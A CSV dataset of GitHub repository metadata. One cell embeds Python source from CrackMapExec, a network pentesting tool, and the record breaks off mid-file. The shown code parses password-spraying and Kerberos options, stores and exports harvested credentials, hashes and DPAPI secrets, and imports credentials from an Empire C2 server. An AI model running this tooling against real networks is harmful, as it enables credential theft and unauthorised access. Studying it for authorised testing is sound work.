name,url,description,stars,forks,last_updated,created,owner,owner_type,owner_url,topics,languages,contributors,commits,branches,releases,default_branch,watchers,open_issues,license,size,Python,R,Java,JavaScript,Go,C,C++,C#,status,status_time
PENTESTING-BIBLE,https://github.com/blaCCkHatHacEEkr/PENTESTING-BIBLE,articles,12437,2320,2023-11-07 16:58:21+00:00,2019-06-28 11:26:57+00:00,blaCCkHatHacEEkr,User,https://github.com/blaCCkHatHacEEkr,[],{},2,482,1,0,master,680,23,MIT License,1498801,{},{},{},{},{},{},{},{},accepted,2023-11-07 19:43:28.178558
CrackMapExec,https://github.com/byt3bl33d3r/CrackMapExec,A swiss army knife for pentesting networks,7787,1615,2023-11-07 15:57:42+00:00,2015-08-14 14:11:55+00:00,byt3bl33d3r,User,https://github.com/byt3bl33d3r,"['python', 'active-directory', 'pentesting', 'windows', 'powershell', 'networks']","{'Python': 3009012, 'PowerShell': 8225, 'VBScript': 5341, 'Nix': 1150, 'Makefile': 560, 'Dockerfile': 485}",81,2437,3,29,master,304,60,"BSD 2-Clause ""Simplified"" License",10297,"{'build_collector.py': '#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\nimport os\nimport shutil\nimport subprocess\nimport sys\nimport time\nfrom datetime import datetime\nfrom pathlib import Path\n\nfrom shiv.bootstrap import Environment\n\n# from distutils.ccompiler import new_compiler\nfrom shiv.builder import create_archive\nfrom shiv.cli import __version__ as VERSION\n\n\ndef build_cme():\n    print(""building CME"")\n    try:\n        shutil.rmtree(""bin"")\n        shutil.rmtree(""build"")\n    except Exception as e:\n        pass\n\n    try:\n        print(""remove useless files"")\n        os.mkdir(""build"")\n        os.mkdir(""bin"")\n        shutil.copytree(""cme"", ""build/cme"")\n\n    except Exception as e:\n        print(e)\n        return\n\n    subprocess.run(\n        [\n            sys.executable,\n            ""-m"",\n            ""pip"",\n            ""install"",\n            ""-e"",\n            ""."",\n            ""-t"",\n            ""build"",\n        ],\n        check=True,\n    )\n\n    # [shutil.rmtree(p) for p in Path(""build"").glob(""**/__pycache__"")]\n    [shutil.rmtree(p) for p in Path(""build"").glob(""**/*.dist-info"")]\n\n    env = Environment(\n        built_at=datetime.utcfromtimestamp(int(time.time())).strftime(""%Y-%m-%d %H:%M:%S""),\n        entry_point=""cme.crackmapexec:main"",\n        script=None,\n        compile_pyc=False,\n        extend_pythonpath=True,\n        shiv_version=VERSION,\n    )\n    create_archive(\n        [Path(""build"").absolute()],\n        Path(""bin/cme""),\n        ""/usr/bin/env -S python -sE"",\n        ""_bootstrap:bootstrap"",\n        env,\n        True,\n    )\n\n\ndef build_cmedb():\n    print(""building CMEDB"")\n    env = Environment(\n        built_at=datetime.utcfromtimestamp(int(time.time())).strftime(""%Y-%m-%d %H:%M:%S""),\n        entry_point=""cme.cmedb:main"",\n        script=None,\n        compile_pyc=False,\n        extend_pythonpath=True,\n        shiv_version=VERSION,\n    )\n    create_archive(\n        [Path(""build"").absolute()],\n        Path(""bin/cmedb""),\n        ""/usr/bin/env -S python -sE"",\n        ""_bootstrap:bootstrap"",\n        env,\n        True,\n    )\n\n\nif __name__ == ""__main__"":\n    try:\n        build_cme()\n        build_cmedb()\n    except:\n        pass\n    finally:\n        shutil.rmtree(""build"")\n', '__init__.py': '\n', 'cli.py': '#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\nimport argparse\nimport sys\nfrom argparse import RawTextHelpFormatter\nfrom cme.loaders.protocolloader import ProtocolLoader\nfrom cme.helpers.logger import highlight\nfrom termcolor import colored\nfrom cme.logger import cme_logger\nimport importlib.metadata\n\n\ndef gen_cli_args():\n    VERSION = importlib.metadata.version(""crackmapexec"")\n    CODENAME = ""John Wick""\n\n    parser = argparse.ArgumentParser(description=f""""""\n      ______ .______           ___        ______  __  ___ .___  ___.      ___      .______    _______ ___   ___  _______   ______\n     /      ||   _  \\         /   \\      /      ||  |/  / |   \\/   |     /   \\     |   _  \\  |   ____|\\  \\ /  / |   ____| /      |\n    |  ,----\'|  |_)  |       /  ^  \\    |  ,----\'|  \'  /  |  \\  /  |    /  ^  \\    |  |_)  | |  |__    \\  V  /  |  |__   |  ,----\'\n    |  |     |      /       /  /_\\  \\   |  |     |    <   |  |\\/|  |   /  /_\\  \\   |   ___/  |   __|    >   <   |   __|  |  |\n    |  `----.|  |\\  \\----. /  _____  \\  |  `----.|  .  \\  |  |  |  |  /  _____  \\  |  |      |  |____  /  .  \\  |  |____ |  `----.\n     \\______|| _| `._____|/__/     \\__\\  \\______||__|\\__\\ |__|  |__| /__/     \\__\\ | _|      |_______|/__/ \\__\\ |_______| \\______|\n\n                                                A swiss army knife for pentesting networks\n                                    Forged by @byt3bl33d3r and @mpgn_x64 using the powah of dank memes\n\n                                                            {highlight(\'Version\', \'red\')} : {highlight(VERSION)}\n                                                            {highlight(\'Codename\', \'red\')}: {highlight(CODENAME)}\n"""""",\n        formatter_class=RawTextHelpFormatter,\n    )\n\n    parser.add_argument(\n        ""-t"",\n        type=int,\n        dest=""threads"",\n        default=100,\n        help=""set how many concurrent threads to use (default: 100)"",\n    )\n    parser.add_argument(\n        ""--timeout"",\n        default=None,\n        type=int,\n        help=""max timeout in seconds of each thread (default: None)"",\n    )\n    parser.add_argument(\n        ""--jitter"",\n        metavar=""INTERVAL"",\n        type=str,\n        help=""sets a random delay between each connection (default: None)"",\n    )\n    parser.add_argument(\n        ""--no-progress"",\n        action=""store_true"",\n        help=""Not displaying progress bar during scan"",\n    )\n    parser.add_argument(""--verbose"", action=""store_true"", help=""enable verbose output"")\n    parser.add_argument(""--debug"", action=""store_true"", help=""enable debug level information"")\n    parser.add_argument(""--version"", action=""store_true"", help=""Display CME version"")\n\n    # we do module arg parsing here so we can reference the module_list attribute below\n    module_parser = argparse.ArgumentParser(add_help=False)\n    mgroup = module_parser.add_mutually_exclusive_group()\n    mgroup.add_argument(""-M"", ""--module"", action=""append"", metavar=""MODULE"", help=""module to use"")\n    module_parser.add_argument(\n        ""-o"",\n        metavar=""MODULE_OPTION"",\n        nargs=""+"",\n        default=[],\n        dest=""module_options"",\n        help=""module options"",\n    )\n    module_parser.add_argument(""-L"", ""--list-modules"", action=""store_true"", help=""list available modules"")\n    module_parser.add_argument(\n        ""--options"",\n        dest=""show_module_options"",\n        action=""store_true"",\n        help=""display module options"",\n    )\n    module_parser.add_argument(\n        ""--server"",\n        choices={""http"", ""https""},\n        default=""https"",\n        help=""use the selected server (default: https)"",\n    )\n    module_parser.add_argument(\n        ""--server-host"",\n        type=str,\n        default=""0.0.0.0"",\n        metavar=""HOST"",\n        help=""IP to bind the server to (default: 0.0.0.0)"",\n    )\n    module_parser.add_argument(\n        ""--server-port"",\n        metavar=""PORT"",\n        type=int,\n        help=""start the server on the specified port"",\n    )\n    module_parser.add_argument(\n        ""--connectback-host"",\n        type=str,\n        metavar=""CHOST"",\n        help=""IP for the remote system to connect back to (default: same as server-host)"",\n    )\n\n    subparsers = parser.add_subparsers(title=""protocols"", dest=""protocol"", description=""available protocols"")\n\n    std_parser = argparse.ArgumentParser(add_help=False)\n    std_parser.add_argument(\n        ""target"",\n        nargs=""+"" if not (module_parser.parse_known_args()[0].list_modules or module_parser.parse_known_args()[0].show_module_options) else ""*"",\n        type=str,\n        help=""the target IP(s), range(s), CIDR(s), hostname(s), FQDN(s), file(s) containing a list of targets, NMap XML or .Nessus file(s)"",\n    )\n    std_parser.add_argument(\n        ""-id"",\n        metavar=""CRED_ID"",\n        nargs=""+"",\n        default=[],\n        type=str,\n        dest=""cred_id"",\n        help=""database credential ID(s) to use for authentication"",\n    )\n    std_parser.add_argument(\n        ""-u"",\n        metavar=""USERNAME"",\n        dest=""username"",\n        nargs=""+"",\n        default=[],\n        help=""username(s) or file(s) containing usernames"",\n    )\n    std_parser.add_argument(\n        ""-p"",\n        metavar=""PASSWORD"",\n        dest=""password"",\n        nargs=""+"",\n        default=[],\n        help=""password(s) or file(s) containing passwords"",\n    )\n    std_parser.add_argument(""-k"", ""--kerberos"", action=""store_true"", help=""Use Kerberos authentication"")\n    std_parser.add_argument(""--no-bruteforce"", action=""store_true"", help=""No spray when using file for username and password (user1 => password1, user2 => password2"")\n    std_parser.add_argument(""--continue-on-success"", action=""store_true"", help=""continues authentication attempts even after successes"")\n    std_parser.add_argument(\n        ""--use-kcache"",\n        action=""store_true"",\n        help=""Use Kerberos authentication from ccache file (KRB5CCNAME)"",\n    )\n    std_parser.add_argument(""--log"", metavar=""LOG"", help=""Export result into a custom file"")\n    std_parser.add_argument(\n        ""--aesKey"",\n        metavar=""AESKEY"",\n        nargs=""+"",\n        help=""AES key to use for Kerberos Authentication (128 or 256 bits)"",\n    )\n    std_parser.add_argument(\n        ""--kdcHost"",\n        metavar=""KDCHOST"",\n        help=""FQDN of the domain controller. If omitted it will use the domain part (FQDN) specified in the target parameter"",\n    )\n\n    fail_group = std_parser.add_mutually_exclusive_group()\n    fail_group.add_argument(\n        ""--gfail-limit"",\n        metavar=""LIMIT"",\n        type=int,\n        help=""max number of global failed login attempts"",\n    )\n    fail_group.add_argument(\n        ""--ufail-limit"",\n        metavar=""LIMIT"",\n        type=int,\n        help=""max number of failed login attempts per username"",\n    )\n    fail_group.add_argument(\n        ""--fail-limit"",\n        metavar=""LIMIT"",\n        type=int,\n        help=""max number of failed login attempts per host"",\n    )\n\n    p_loader = ProtocolLoader()\n    protocols = p_loader.get_protocols()\n\n    for protocol in protocols.keys():\n        try:\n            protocol_object = p_loader.load_protocol(protocols[protocol][""argspath""])\n            subparsers = protocol_object.proto_args(subparsers, std_parser, module_parser)\n        except:\n            cme_logger.exception(f""Error loading proto_args from proto_args.py file in protocol folder: {protocol}"")\n\n    if len(sys.argv) == 1:\n        parser.print_help()\n        sys.exit(1)\n\n    args = parser.parse_args()\n\n    if args.version:\n        print(f""{VERSION} - {CODENAME}"")\n        sys.exit(1)\n\n    return args\n', 'cmedb.py': '#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\nimport cmd\nimport configparser\nimport csv\nimport os\nfrom os import listdir\nfrom os.path import exists\nfrom os.path import join as path_join\nimport shutil\nfrom sqlite3 import connect\nimport sys\nfrom textwrap import dedent\n\nfrom requests import get, post, ConnectionError\nfrom sqlalchemy import create_engine\nfrom terminaltables import AsciiTable\n\nfrom cme.loaders.protocolloader import ProtocolLoader\nfrom cme.paths import CONFIG_PATH, WS_PATH, WORKSPACE_DIR\n\n\nclass UserExitedProto(Exception):\n    pass\n\n\ndef create_db_engine(db_path):\n    db_engine = create_engine(f""sqlite:///{db_path}"", isolation_level=""AUTOCOMMIT"", future=True)\n    return db_engine\n\n\ndef print_table(data, title=None):\n    print("""")\n    table = AsciiTable(data)\n    if title:\n        table.title = title\n    print(table.table)\n    print("""")\n\n\ndef write_csv(filename, headers, entries):\n    """"""\n    Writes a CSV file with the provided parameters.\n    """"""\n    with open(os.path.expanduser(filename), ""w"") as export_file:\n        csv_file = csv.writer(\n            export_file,\n            delimiter="";"",\n            quoting=csv.QUOTE_ALL,\n            lineterminator=""\\n"",\n            escapechar=""\\\\"",\n        )\n        csv_file.writerow(headers)\n        for entry in entries:\n            csv_file.writerow(entry)\n\n\ndef write_list(filename, entries):\n    """"""\n    Writes a file with a simple list\n    """"""\n    with open(os.path.expanduser(filename), ""w"") as export_file:\n        for line in entries:\n            export_file.write(line + ""\\n"")\n    return\n\n\ndef complete_import(text, line):\n    """"""\n    Tab-complete \'import\' commands\n    """"""\n    commands = (""empire"", ""metasploit"")\n    mline = line.partition("" "")[2]\n    offs = len(mline) - len(text)\n    return [s[offs:] for s in commands if s.startswith(mline)]\n\n\ndef complete_export(text, line):\n    """"""\n    Tab-complete \'creds\' commands.\n    """"""\n    commands = (\n        ""creds"",\n        ""plaintext"",\n        ""hashes"",\n        ""shares"",\n        ""local_admins"",\n        ""signing"",\n        ""keys"",\n    )\n    mline = line.partition("" "")[2]\n    offs = len(mline) - len(text)\n    return [s[offs:] for s in commands if s.startswith(mline)]\n\n\ndef print_help(help_string):\n    print(dedent(help_string))\n\n\nclass DatabaseNavigator(cmd.Cmd):\n    def __init__(self, main_menu, database, proto):\n        cmd.Cmd.__init__(self)\n        self.main_menu = main_menu\n        self.config = main_menu.config\n        self.proto = proto\n        self.db = database\n        self.prompt = f""cmedb ({main_menu.workspace})({proto}) > ""\n\n    def do_exit(self, line):\n        self.db.shutdown_db()\n        sys.exit()\n\n    @staticmethod\n    def help_exit():\n        help_string = """"""\n        Exits\n        """"""\n        print_help(help_string)\n\n    def do_back(self, line):\n        raise UserExitedProto\n\n    def do_export(self, line):\n        if not line:\n            print(""[-] not enough arguments"")\n            return\n        line = line.split()\n        command = line[0].lower()\n        # Need to use if/elif/else to keep compatibility with py3.8/3.9\n        # Reference DB Function cme/protocols/smb/database.py\n        # Users\n        if command == ""creds"":\n            if len(line) < 3:\n                print(""[-] invalid arguments, export creds <simple|detailed|hashcat> <filename>"")\n                return\n\n            filename = line[2]\n            creds = self.db.get_credentials()\n            csv_header = (\n                ""id"",\n                ""domain"",\n                ""username"",\n                ""password"",\n                ""credtype"",\n                ""pillaged_from"",\n            )\n\n            if line[1].lower() == ""simple"":\n                write_csv(filename, csv_header, creds)\n            elif line[1].lower() == ""detailed"":\n                formatted_creds = []\n\n                for cred in creds:\n                    entry = [\n                        cred[0],  # ID\n                        cred[1],  # Domain\n                        cred[2],  # Username\n                        cred[3],  # Password/Hash\n                        cred[4],  # Cred Type\n                    ]\n                    if cred[5] is None:\n                        entry.append("""")\n                    else:\n                        entry.append(self.db.get_hosts(cred[5])[0][2])\n                    formatted_creds.append(entry)\n                write_csv(filename, csv_header, formatted_creds)\n            elif line[1].lower() == ""hashcat"":\n                usernames = []\n                passwords = []\n                for cred in creds:\n                    if cred[4] == ""hash"":\n                        usernames.append(cred[2])\n                        passwords.append(cred[3])\n                output_list = [\':\'.join(combination) for combination in zip(usernames, passwords)]\n                write_list(filename, output_list)\n            else:\n                print(f""[-] No such export option: {line[1]}"")\n                return\n            print(""[+] Creds exported"")\n        # Hosts\n        elif command == ""hosts"":\n            if len(line) < 3:\n                print(""[-] invalid arguments, export hosts <simple|detailed|signing> <filename>"")\n                return\n\n            csv_header_simple = (\n                ""id"",\n                ""ip"",\n                ""hostname"",\n                ""domain"",\n                ""os"",\n                ""dc"",\n                ""smbv1"",\n                ""signing"",\n            )\n            csv_header_detailed = (\n                ""id"",\n                ""ip"",\n                ""hostname"",\n                ""domain"",\n                ""os"",\n                ""dc"",\n                ""smbv1"",\n                ""signing"",\n                ""spooler"",\n                ""zerologon"",\n                ""petitpotam"",\n            )\n            filename = line[2]\n\n            if line[1].lower() == ""simple"":\n                hosts = self.db.get_hosts()\n                simple_hosts = [host[:8] for host in hosts]\n                write_csv(filename, csv_header_simple, simple_hosts)\n            # TODO: maybe add more detail like who is an admin on it, shares discovered, etc\n            elif line[1].lower() == ""detailed"":\n                hosts = self.db.get_hosts()\n                write_csv(filename, csv_header_detailed, hosts)\n            elif line[1].lower() == ""signing"":\n                hosts = self.db.get_hosts(""signing"")\n                signing_hosts = [host[1] for host in hosts]\n                write_list(filename, signing_hosts)\n            else:\n                print(f""[-] No such export option: {line[1]}"")\n                return\n            print(""[+] Hosts exported"")\n        # Shares\n        elif command == ""shares"":\n            if len(line) < 3:\n                print(""[-] invalid arguments, export shares <simple|detailed> <filename>"")\n                return\n\n            shares = self.db.get_shares()\n            csv_header = (""id"", ""host"", ""userid"", ""name"", ""remark"", ""read"", ""write"")\n            filename = line[2]\n\n            if line[1].lower() == ""simple"":\n                write_csv(filename, csv_header, shares)\n                print(""[+] shares exported"")\n            # Detailed view gets hostname, usernames, and true false statement\n            elif line[1].lower() == ""detailed"":\n                formatted_shares = []\n                for share in shares:\n                    user = self.db.get_users(share[2])[0]\n                    if self.db.get_hosts(share[1]): \n                        share_host = self.db.get_hosts(share[1])[0][2] \n                    else: \n                        share_host = ""ERROR""\n\n                    entry = (\n                        share[0],  # shareID\n                        share_host,  # hosts\n                        f""{user[1]}\\{user[2]}"",  # userID\n                        share[3],  # name\n                        share[4],  # remark\n                        bool(share[5]),  # read\n                        bool(share[6]),  # write\n                    )\n                    formatted_shares.append(entry)\n                write_csv(filename, csv_header, formatted_shares)\n                print(""[+] Shares exported"")\n            else:\n                print(f""[-] No such export option: {line[1]}"")\n                return\n        # Local Admin\n        elif command == ""local_admins"":\n            if len(line) < 3:\n                print(""[-] invalid arguments, export local_admins <simple|detailed> <filename>"")\n                return\n\n            # These values don\'t change between simple and detailed\n            local_admins = self.db.get_admin_relations()\n            csv_header = (""id"", ""userid"", ""host"")\n            filename = line[2]\n\n            if line[1].lower() == ""simple"":\n                write_csv(filename, csv_header, local_admins)\n            elif line[1].lower() == ""detailed"":\n                formatted_local_admins = []\n                for entry in local_admins:\n                    user = self.db.get_users(filter_term=entry[1])[0]\n\n                    formatted_entry = (\n                        entry[0],  # Entry ID\n                        f""{user[1]}/{user[2]}"",  # DOMAIN/Username\n                        self.db.get_hosts(filter_term=entry[2])[0][2],  # Hostname\n                    )\n                    # Can\'t modify a tuple which is what self.db.get_admin_relations() returns\n                    formatted_local_admins.append(formatted_entry)\n                write_csv(filename, csv_header, formatted_local_admins)\n            else:\n                print(f""[-] No such export option: {line[1]}"")\n                return\n            print(""[+] Local Admins exported"")\n        elif command == ""dpapi"":\n            if len(line) < 3:\n                print(""[-] invalid arguments, export dpapi <simple|detailed> <filename>"")\n                return\n\n            # These values don\'t change between simple and detailed\n            dpapi_secrets = self.db.get_dpapi_secrets()\n            csv_header = (\n                ""id"",\n                ""host"",\n                ""dpapi_type"",\n                ""windows_user"",\n                ""username"",\n                ""password"",\n                ""url"",\n            )\n            filename = line[2]\n\n            if line[1].lower() == ""simple"":\n                write_csv(filename, csv_header, dpapi_secrets)\n            elif line[1].lower() == ""detailed"":\n                formatted_dpapi_secret = []\n                for entry in dpapi_secrets:\n                    formatted_entry = (\n                        entry[0],  # Entry ID\n                        self.db.get_hosts(filter_term=entry[1])[0][2],  # Hostname\n                        entry[2],  # DPAPI type\n                        entry[3],  # Windows User\n                        entry[4],  # Username\n                        entry[5],  # Password\n                        entry[6],  # URL\n                    )\n                    # Can\'t modify a tuple which is what self.db.get_admin_relations() returns\n                    formatted_dpapi_secret.append(formatted_entry)\n                write_csv(filename, csv_header, formatted_dpapi_secret)\n            else:\n                print(f""[-] No such export option: {line[1]}"")\n                return\n            print(""[+] DPAPI secrets exported"")\n        elif command == ""keys"":\n            if line[1].lower() == ""all"":\n                keys = self.db.get_keys()\n            else:\n                keys = self.db.get_keys(key_id=int(line[1]))\n            writable_keys = [key[2] for key in keys]\n            filename = line[2]\n            write_list(filename, writable_keys)\n        elif command == ""wcc"":\n            if len(line) < 3:\n                print(""[-] invalid arguments, export wcc <simple|detailed> <filename>"")\n                return\n\n            csv_header_simple = (\n                ""id"",\n                ""ip"",\n                ""hostname"",\n                ""check"",\n                ""status"",\n            )\n            csv_header_detailed = (\n                ""id"",\n                ""ip"",\n                ""hostname"",\n                ""check"",\n                ""description"",\n                ""status"",\n                ""reasons""\n            )\n            filename = line[2]\n            host_mapping = {}\n            check_mapping = {}\n\n            hosts = self.db.get_hosts()\n            checks = self.db.get_checks()\n            check_results = self.db.get_check_results()\n            rows = []\n\n            for result_id,hostid,checkid,secure,reasons in check_results:\n                row = [result_id]\n                if hostid in host_mapping:\n                    row.extend(host_mapping[hostid])\n                else:\n                    for host_id,ip,hostname,_,_,_,_,_,_,_,_ in hosts:\n                        if host_id == hostid:\n                            row.extend([ip, hostname])\n                            host_mapping[hostid] = [ip, hostname]\n                            break\n                if checkid in check_mapping:\n                    row.extend(check_mapping[checkid])\n                else:\n                    for check in checks:\n                        check_id, name, description = check\n                        if check_id == checkid:\n                            row.extend([name, description])\n                            check_mapping[checkid] = [name, description]\n                            break\n                row.append(\'OK\' if secure else \'KO\')\n                row.append(reasons)\n                rows.append(row)\n\n            if line[1].lower() == ""simple"":\n                simple_rows = list((row[0], row[1], row[2], row[3], row[5]) for row in rows)\n                write_csv(filename, csv_header_simple, simple_rows)\n            elif line[1].lower() == ""detailed"":\n                write_csv(filename, csv_header_detailed, rows)\n            elif line[1].lower() == ""signing"":\n                hosts = self.db.get_hosts(""signing"")\n                signing_hosts = [host[1] for host in hosts]\n                write_list(filename, signing_hosts)\n            else:\n                print(f""[-] No such export option: {line[1]}"")\n                return\n            print(""[+] WCC exported"")\n        else:\n            print(""[-] Invalid argument, specify creds, hosts, local_admins, shares, wcc or dpapi"")\n\n    @staticmethod\n    def help_export():\n        help_string = """"""\n        export [creds|hosts|local_admins|shares|signing|keys] [simple|detailed|*] [filename]\n        Exports information to a specified file\n        \n        * hosts has an additional third option from simple and detailed: signing - this simply writes a list of ips of\n        hosts where signing is enabled\n        * keys\' third option is either ""all"" or an id of a key to export\n            export keys [all|id] [filename]\n        """"""\n        print_help(help_string)\n\n    def do_import(self, line):\n        if not line:\n            return\n\n        if line == ""empire"":\n            headers = {""Content-Type"": ""application/json""}\n            # Pull the username and password from the config file\n            payload = {\n                ""username"": self.config.get(""Empire"", ""username""),\n                ""password"": self.config.get(""Empire"", ""password""),\n            }\n            # Pull the host and port from the config file\n            base_url = f""https://{self.config.get(\'Empire\', \'api_host\')}:{self.config.get(\'Empire\', \'api_port\')}""\n\n            try:\n                r = post(\n                    base_url + ""/api/admin/login"",\n                    json=payload,\n                    headers=headers,\n                    verify=False,\n                )\n                if r.status_code == 200:\n                    token = r.json()[""token""]\n                    url_params = {""token"": token}\n                    r = get(\n                        base_url + ""/api/creds"",\n                        headers=headers,\n                        params=url_params,\n                        verify=False,\n                    )\n                    creds = r.json()\n\n                    for cred in creds[""creds""]:\n                        if cred[""credtype""] == ""token"" or cred[""credtype""] == ""krbtgt"" or cred[""username""].endswith(""$""):\n                            continue\n                        self.db.add_credential(\n                            cred[""credtype""],\n                            cred[""domain""],\n                            cred[""username""],\n                            cred[""password""],\n                        )\n                    print(""[+] Empire credential import successful"")\n                else:\n                    print(""[-] Error authenticating to Empire\'s RESTful API server!"")\n            except ConnectionError as e:\n                print(f""[-] Unable to connect to Empire\'s RESTful API server: {e}"")\n\n\nclass CMEDBMenu(cmd.Cmd):\n    def __init__(self, config_path):\n        cmd.Cmd.__init__(self)\n        self.config_path = config_path\n\n        try:\n            self.config = configparser.ConfigParser()\n            self.config.read(self.config_path)\n        except Exception as e:\n            print(f""[-] Error reading cme.conf: {e}"")\n            sys.exit(1)\n\n        self.conn = None\n        self.p_loader = ProtocolLoader()\n        self.protocols = self.p_loader.get_protocols()\n\n        self.workspace = self.config.get(""CME"", ""workspace"")\n        self.do_workspace(self.workspace)\n\n        self.db = self.config.get(""CME"", ""last_used_db"")\n        if self.db:\n            self.do_proto(self.db)\n\n    def write_configfile(self):\n        with open(self.config_path, ""w"") as configfile:\n            self.config.write(configfile)\n\n    def do_proto(self, proto):\n        if not proto:\n            return\n\n        proto_db_path = path_join(WORKSPACE_DIR, self.workspace, f""{proto}.db"")\n        if exists(proto_db_path):\n            self.conn = create_db_engine(proto_db_path)\n            db_nav_object = self.p_loader.load_protocol(self.protocols[proto][""nvpath""])\n            db_object = self.p_loader.load_protocol(self.protocols[proto][""dbpath""])\n            self.config.set(""CME"", ""last_used_db"", proto)\n            self.write_configfile()\n            try:\n                proto_menu = getattr(db_nav_object, ""navigator"")(self, getattr(db_object, ""database"")(self.conn), proto)\n                proto_menu.cmdloop()\n            except UserExitedProto:\n                pass\n\n    @staticmethod\n    def help_proto():\n        help_string = """"""\n        proto [smb|mssql|winrm]\n            *unimplemented protocols: ftp, rdp, ldap, ssh\n        Changes cmedb to the specified protocol\n        """"""\n        print_help(help_string)\n\n    def do_workspace(self, line):\n        line = line.strip()\n        if not line:\n            subcommand = """"\n            self.help_workspace()\n        else:\n            subcommand = line.split()[0]\n\n        if subcommand == ""create"":\n            new_workspace = line.split()[1].strip()\n            print(f""[*] Creating workspace \'{new_workspace}\'"")\n            self.create_workspace(new_workspace, self.p_loader, self.protocols)\n            self.do_workspace(new_workspace)\n        elif subcommand == ""list"":\n            print(""[*] Enumerating Workspaces"")\n            for workspace in listdir(path_join(WORKSPACE_DIR)):\n                if workspace == self.workspace:\n                    print(""==> "" + workspace)\n                else:\n                    print(workspace)\n        elif exists(path_join(WORKSPACE_DIR, line)):\n            self.config.set(""CME"", ""workspace"", line)\n            self.write_configfile()\n            self.workspace = line\n            self.prompt = f""cmedb ({line}) > ""\n\n    @staticmethod\n    def help_workspace():\n        help_string = """"""\n        workspace [create <targetName> | workspace list | workspace <targetName>]\n        """"""\n        print_help(help_string)\n\n    @staticmethod\n    def do_exit(line):\n        sys.exit()\n\n    @staticmethod\n    def help_exit():\n        help_string = """"""\n        Exits\n        """"""\n        print_help(help_string)\n\n    @staticmethod\n    def create_workspace(workspace_name, p_loader, protocols):\n        os.mkdir(path_join(WORKSPACE_DIR, workspace_name))\n\n        for protocol in protocols.keys():\n            protocol_object = p_loader.load_protocol(protocols[protocol][""dbpath""])\n            proto_db_path = path_join(WORKSPACE_DIR, workspace_name, f""{protocol}.db"")\n\n            if not exists(proto_db_path):\n                print(f""[*] Initializing {protocol.upper()} protocol database"")\n                conn = connect(proto_db_path)\n                c = conn.cursor()\n\n                # try to prevent some weird sqlite I/O errors\n                c.execute(""PRAGMA journal_mode = OFF"")\n                c.execute(""PRAGMA foreign_keys = 1"")\n\n                getattr(protocol_object, ""database"").db_schema(c)\n\n                # commit the changes and close everything off\n                conn.commit()\n                conn.close()\n\n\ndef delete_workspace(workspace_name):\n    shutil.rmtree(path_join(WORKSPACE_DIR, workspace_name))\n\n\ndef initialize_db(logger):\n    if not exists(path_join(WS_PATH, ""default"")):\n        logger.debug(""Creating default workspace"")\n        os.mkdir(path_join(WS_PATH, ""default""))\n\n    p_loader = ProtocolLoader()\n    protocols = p_loader.get_protocols()\n    for protocol in protocols.keys():\n        protocol_object = p_loader.load_protocol(protocols[protocol][""dbpath""])\n        proto_db_path = path_join(WS_PATH, ""default"", f""{protocol}.db"")\n\n        if not exists(proto_db_path):\n            logger.debug(f""Initializing {protocol.upper()} protocol database"")\n            conn = connect(proto_db_path)\n            c = conn.cursor()\n            # try to prevent some weird sqlite I/O errors\n            c.execute(""PRAGMA journal_mode = OFF"")  # could try setting to PERSIST if DB corruption starts occurring\n            c.execute(""PRAGMA foreign_keys = 1"")\n            # set a small timeout (5s) so if another thread is writing to the database, the entire program doesn\'t crash\n            c.execute(""PRAGMA busy_timeout = 5000"")\n            getattr(protocol_object, ""database"").db_schema(c)\n            # commit the changes and close everything off\n            conn.commit()\n            conn.close()\n\n\ndef main():\n    if not exists(CONFIG_PATH):\n        print(""[-] Unable to find config file"")\n        sys.exit(1)\n    try:\n        cmedbnav = CMEDBMenu(CONFIG_PATH)\n        cmedbnav.cmdloop()\n    except KeyboardInterrupt:\n        pass\n\n\nif __name__ == ""__main__"":\n    main()\n', 'config.py': '# coding=utf-8\nimport os\nfrom os.path import join as path_join\nimport configparser\nfrom cme.paths import CME_PATH, DATA_PATH\nfrom cme.first_run import first_run_setup\nfrom cme.logger import cme_logger\nfrom ast import literal_eval\n\ncme_default_config = configparser.ConfigParser()\ncme_default_config.read(path_join(DATA_PATH, ""cme.conf""))\n\ncme_config = configparser.ConfigParser()\ncme_config.read(os.path.join(CME_PATH, ""cme.conf""))\n\nif ""CME"" not in cme_config.sections():\n    first_run_setup()\n    cme_config.read(os.path.join(CME_PATH, ""cme.conf""))\n\n# Check if there are any missing options in the config file\nfor section in cme_default_config.sections():\n    for option in cme_default_config.options(section):\n        if not cme_config.has_option(section, option):\n            cme_logger.display(f""Adding missing option \'{option}\' in config section \'{section}\' to cme.conf"")\n            cme_config.set(section, option, cme_default_config.get(section, option))\n\n            with open(path_join(CME_PATH, ""cme.conf""), ""w"") as config_file:\n                cme_config.write(config_file)\n\n#!!! THESE OPTIONS HAVE TO EXIST IN THE DEFAULT CONFIG FILE !!!\ncme_workspace = cme_config.get(""CME"", ""workspace"", fallback=""default"")\npwned_label = cme_config.get(""CME"", ""pwn3d_label"", fallback=""Pwn3d!"")\naudit_mode = cme_config.get(""CME"", ""audit_mode"", fallback=False)\nreveal_chars_of_pwd = int(cme_config.get(""CME"", ""reveal_chars_of_pwd"", fallback=0))\nconfig_log = cme_config.getboolean(""CME"", ""log_mode"", fallback=False)\nignore_opsec = cme_config.getboolean(""CME"", ""ignore_opsec"", fallback=False)\nhost_info_colors = literal_eval(cme_config.get(""CME"", ""host_info_colors"", fallback=[""green"", ""red"", ""yellow"", ""cyan""]))\n\n\nif len(host_info_colors) != 4:\n    cme_logger.error(""Config option host_info_colors must have 4 values! Using default values."")\n    host_info_colors = cme_default_config.get(""CME"", ""host_info_colors"")\n\n\n# this should probably be put somewhere else, but if it\'s in the config helpers, there is a circular import\ndef process_secret(text):\n    hidden = text[:reveal_chars_of_pwd]\n    return text if not audit_mode else hidden+audit_mode * 8 \n', 'connection.py': '#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\nimport random\nimport socket\nfrom socket import AF_INET, AF_INET6, SOCK_DGRAM, IPPROTO_IP, AI_CANONNAME\nfrom socket import getaddrinfo\nfrom os.path import isfile\nfrom threading import BoundedSemaphore\nfrom functools import wraps\nfrom time import sleep\nfrom ipaddress import ip_address\n\nfrom cme.config import pwned_label\nfrom cme.helpers.logger import highlight\nfrom cme.logger import cme_logger, CMEAdapter\nfrom cme.context import Context\n\nfrom impacket.dcerpc.v5 import transport\n\nsem = BoundedSemaphore(1)\nglobal_failed_logins = 0\nuser_failed_logins = {}\n\n\ndef gethost_addrinfo(hostname):\n    try:\n        for res in getaddrinfo( hostname, None, AF_INET6, SOCK_DGRAM, IPPROTO_IP, 